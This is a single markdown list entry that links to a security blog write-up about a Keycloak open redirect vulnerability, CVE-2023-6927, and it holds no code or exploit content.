- [Writeup: Keycloak open redirect (CVE-2023-6927)](https://securityblog.omegapoint.se/en/writeup-keycloak-cve-2023-6927/)
